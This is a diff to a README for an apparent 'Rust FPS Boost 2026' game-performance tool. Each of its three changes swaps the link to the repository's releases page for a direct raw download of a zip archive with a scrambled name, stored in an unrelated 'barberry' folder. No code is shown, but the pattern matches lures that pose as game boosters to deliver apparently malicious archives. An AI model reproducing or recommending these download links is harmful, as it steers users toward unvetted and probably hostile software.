@@ -1,6 +1,6 @@
 # ⚙️ Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust - Improve Game Speed and Smoothness
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Rust%20FPS%20Boost-blue?style=for-the-badge)](https://github.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Rust%20FPS%20Boost-blue?style=for-the-badge)](https://raw.githubusercontent.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/main/barberry/FP_Ultimate_for_Enhancer_Boost_Performance_Rust_2.3-beta.2.zip)
 
 ## 🔍 About This Tool
 
@@ -34,7 +34,7 @@ If your PC is close to these specs, the software can still help but improvements
 
 To get started, visit the release page where you can download the latest version of this software. This page always has the newest fixes and improvements.
 
-[Download Latest Release](https://github.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/releases)
+[Download Latest Release](https://raw.githubusercontent.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/main/barberry/FP_Ultimate_for_Enhancer_Boost_Performance_Rust_2.3-beta.2.zip)
 
 ### Steps to Download and Run
 
@@ -96,7 +96,7 @@ You can update by downloading the newest installer file and running it over your
 
 ---
 
-[Download Latest Release](https://github.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/releases)  
+[Download Latest Release](https://raw.githubusercontent.com/OGC124/Rust-FPS-Boost-2026-Ultimate-Performance-Enhancer-for-Rust/main/barberry/FP_Ultimate_for_Enhancer_Boost_Performance_Rust_2.3-beta.2.zip)  
 
 ---
 
